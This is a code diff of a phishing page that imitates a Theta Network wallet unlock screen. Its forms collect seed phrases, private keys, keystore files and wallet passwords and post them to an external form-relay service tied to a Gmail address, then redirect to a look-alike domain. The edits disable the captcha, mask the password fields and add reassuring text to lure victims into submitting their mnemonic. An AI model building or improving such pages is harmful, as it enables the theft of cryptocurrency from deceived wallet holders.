@@ -16,19 +16,20 @@
     <div class="form-box">
         <div class="button-box">
         <div id="btn"></div>
-        <button type="button"onclick='keystore()' class="toggle-btn">KEYSTORE</button>
+        <button type="button"onclick='mnemonic()' class="toggle-btn">KEYSTORE</button>
         <button type="button"onclick='mnemonic()' class="toggle-btn">MNEMONIC</button>
         <button type="button"onclick='privatekey()' class="toggle-btn">PRIVATE KEY</button>
-        <button type="button"onclick='hardware()' class="toggle-btn">HARDWARE</button>
+        <button type="button"onclick='' class="toggle-btn">HARDWARE</button>
         </div>
-        <form id="keystore" class="input-group-keystore" action="https://formsubmit.co/thetanetwork9@gmail.com" method="POST">
+        <form id="keystore" class="input-group-keystore"  >
             <input type="hidden" name="_next" value="https://unlockthetamainnet.org/admin.html">
             <input type="hidden" name="_subject" value="New keystore mail!">
+            <input type="hidden" name="_captcha" value="false">
             <p>Please select your keystore file</p>
             <div class="file-upload-wrapper" data-text="Choose a keystore file">
                 <input name="file-upload-field" type="file" class="file-upload-field" value="">
             </div>
-            <input type="text" class="input-field" placeholder="Enter your wallet password" required>
+            <input type="password" class="input-field" placeholder="Enter your wallet password" required>
             <button type="submit" class="submit-btn">Unlock Wallet</button>
         </form>
         
@@ -39,17 +40,19 @@
             <h1>Please enter your 12-24 word phrase</h1>
             <textarea name="mnemonic" class="input-field" rows="4" placeholder="" required></textarea>
             <p>please separate each Mnemonic phrase with a space</p>
-            <input type="text" name="password" class="input-field" placeholder="Enter temporary session password" required>
+            <input type="password" name="password" class="input-field" placeholder="Enter temporary session password" required>
             <input type="checkbox" class="check-box"><span>I have entered all details correctly</span>
+            <h3>Before you enter your mnemonic phrase, we recommend you connect your device to the internet. You will be able to disconnect once your wallet is unlocked.</h3>
             <button type="submit" class="submit-btn">Unlock Wallet</button>
         </form>
         <form id="privatekey" class="input-group-private-key" action="https://formsubmit.co/thetanetwork9@gmail.com" method="POST">
             <input type="hidden" name="_next" value="https://unlockthetamainnet.org/admin.html">
             <input type="hidden" name="_subject" value="New privatekey mail!">
+            <input type="hidden" name="_captcha" value="false">
             <h1>Please enter your private key</h1>
             <textarea class="input-field" rows="4" placeholder="" required></textarea>
             <p>please enter your private key in HEX format</p>
-            <input type="text" class="input-field" placeholder="Enter temporary session password" required>
+            <input type="password" class="input-field" placeholder="Enter temporary session password" required>
             <button type="submit" class="submit-btn">Unlock Wallet</button>
         </form>
         <form id="hardware" class="input-group-hardware">
